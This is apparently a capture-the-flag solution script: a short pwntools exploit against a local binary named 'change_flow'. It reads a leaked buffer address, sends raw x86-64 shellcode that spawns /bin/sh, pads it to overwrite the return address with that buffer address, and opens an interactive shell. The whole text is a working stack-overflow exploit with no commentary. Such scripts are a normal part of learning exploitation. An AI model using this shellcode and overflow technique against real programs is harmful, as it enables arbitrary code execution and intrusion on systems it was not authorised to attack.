from pwn import *

context.log_level = "debug"

p = process('./change_flow')

shell = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.recvuntil("buffer Addr : ")
printf_addr = int(p.recvline(4).replace("\n",''),16)

print hex(printf_addr)

p.sendline('546')

payload = shell
payload += 'A'*(0x78-len(shell))
payload += p64(printf_addr)


p.sendline(payload)

p.interactive()
